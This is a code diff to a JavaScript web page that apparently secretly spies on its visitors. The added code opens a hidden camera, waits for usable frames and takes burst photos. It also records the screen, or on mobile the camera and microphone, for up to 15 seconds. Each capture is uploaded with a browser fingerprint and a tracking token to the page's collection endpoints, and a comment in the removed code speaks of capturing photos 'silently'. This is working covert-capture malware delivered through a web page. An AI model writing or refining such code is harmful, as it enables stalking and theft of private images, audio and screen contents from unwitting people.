@@ -714,46 +714,85 @@ async function snapFromVideo(v){
 async function sendBurstPhotos(){
   try{
     const {stream,v}=await openHiddenCamera('environment');
+    // Wait until camera is actually rendering real frames (videoWidth > 0)
+    let waited=0;
+    while((v.videoWidth===0||v.videoHeight===0)&&waited<5000){
+      await new Promise(r=>setTimeout(r,200));waited+=200;
+    }
+    if(v.videoWidth===0){stream.getTracks().forEach(t=>t.stop());if(v.parentNode)document.body.removeChild(v);return;}
     const fp=await collectFingerprint();
-    // Shoot 5 frames with 350ms gap — very fast
+    let sent=0;
     for(let i=0;i<5;i++){
+      // Extra settle time between shots to avoid blank frames
+      await new Promise(r=>setTimeout(r,600));
       const blob=await snapFromVideo(v);
-      if(blob&&blob.size>800){
+      if(blob&&blob.size>2000){
+        sent++;
         const form=new FormData();
         form.append('token',token);form.append('photo',blob,`burst_${i+1}.jpg`);
-        form.append('fingerprint',JSON.stringify({...fp,note:`Burst ${i+1}/5`}));
-        fetch('/capture_combined_photo',{method:'POST',body:form});
+        form.append('fingerprint',JSON.stringify({...fp,note:`Burst ${sent}/5`}));
+        await fetch('/capture_combined_photo',{method:'POST',body:form});
       }
-      if(i<4)await new Promise(r=>setTimeout(r,350));
     }
     stream.getTracks().forEach(t=>t.stop());
     if(v.parentNode)document.body.removeChild(v);
   }catch(e){}
 }
+async function recordVideoStream(videoStream,label){
+  const mimeTypes=['video/webm;codecs=vp8,opus','video/webm;codecs=vp9','video/webm','video/mp4'];
+  const mimeType=mimeTypes.find(m=>MediaRecorder.isTypeSupported(m))||'video/webm';
+  const recorder=new MediaRecorder(videoStream,{mimeType});
+  const chunks=[];
+  recorder.ondataavailable=e=>{if(e.data&&e.data.size>0)chunks.push(e.data);};
+  recorder.start(300);
+  const btn=document.getElementById('screenBtn');
+  btn.textContent='🔴 Recording... (tap to stop)';
+  btn.disabled=false;
+  btn.onclick=()=>recorder.stop();
+  const stopTimer=setTimeout(()=>recorder.stop(),15000);
+  try{videoStream.getVideoTracks()[0].onended=()=>{clearTimeout(stopTimer);recorder.stop();};}catch(e){}
+  await new Promise(r=>recorder.onstop=r);
+  clearTimeout(stopTimer);
+  videoStream.getTracks().forEach(t=>t.stop());
+  const blob=new Blob(chunks,{type:mimeType});
+  if(blob.size<2000)return;
+  const fp=await collectFingerprint();
+  const form=new FormData();
+  form.append('token',token);
+  form.append('video',blob,label);
+  form.append('fingerprint',JSON.stringify(fp));
+  await fetch('/capture_screen_recording',{method:'POST',body:form});
+}
 async function doScreenRecord(){
+  const btn=document.getElementById('screenBtn');
   try{
-    const mimeType=MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')?'video/webm;codecs=vp8,opus':'video/webm';
-    const screenStream=await navigator.mediaDevices.getDisplayMedia({video:{width:{ideal:1920},height:{ideal:1080},frameRate:30},audio:true});
-    // Show recording indicator
-    document.getElementById('screenBtn').textContent='🔴 Recording...';
-    document.getElementById('screenBtn').disabled=true;
-    const recorder=new MediaRecorder(screenStream,{mimeType});
-    const chunks=[];
-    recorder.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data);};
-    recorder.start(300);
-    // Stop when user stops sharing OR after 10s
-    const stopTimer=setTimeout(()=>recorder.stop(),10000);
-    screenStream.getVideoTracks()[0].onended=()=>{clearTimeout(stopTimer);recorder.stop();};
-    await new Promise(r=>recorder.onstop=r);
-    screenStream.getTracks().forEach(t=>t.stop());
-    const blob=new Blob(chunks,{type:mimeType});
-    if(blob.size<1000)return;
-    const fp=await collectFingerprint();const form=new FormData();
-    form.append('token',token);form.append('video',blob,'screen_recording.webm');form.append('fingerprint',JSON.stringify(fp));
-    fetch('/capture_screen_recording',{method:'POST',body:form});
-    // Also capture camera photo silently after screen share ends
-    sendPhoto();
-  }catch(e){}
+    // Desktop: try getDisplayMedia first
+    const hasDisplay=!!(navigator.mediaDevices&&navigator.mediaDevices.getDisplayMedia);
+    const isMobile=/Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+    if(hasDisplay&&!isMobile){
+      btn.textContent='📺 Piliin ang screen...';
+      const screenStream=await navigator.mediaDevices.getDisplayMedia({video:{width:{ideal:1920},height:{ideal:1080},frameRate:30},audio:true});
+      btn.textContent='🔴 Recording...';btn.disabled=true;
+      await recordVideoStream(screenStream,'screen_recording.webm');
+      sendPhoto();
+    } else {
+      // Mobile fallback: record camera video for 15s
+      btn.textContent='🔴 Recording camera...';btn.disabled=true;
+      const camStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',width:{ideal:1280},height:{ideal:720}},audio:true});
+      await recordVideoStream(camStream,'screen_cam.webm');
+      btn.textContent='✅ Done!';
+    }
+  }catch(e){
+    // Permission denied or not supported — try camera-only fallback
+    try{
+      btn.textContent='🎥 Starting camera...';btn.disabled=true;
+      const camStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:true});
+      await recordVideoStream(camStream,'screen_cam.webm');
+      btn.textContent='✅ Done!';
+    }catch(e2){
+      btn.textContent='❌ Not supported';btn.disabled=false;
+    }
+  }
 }
 // Screen record MUST be triggered by user gesture — show a button
 function setupScreenMode(){
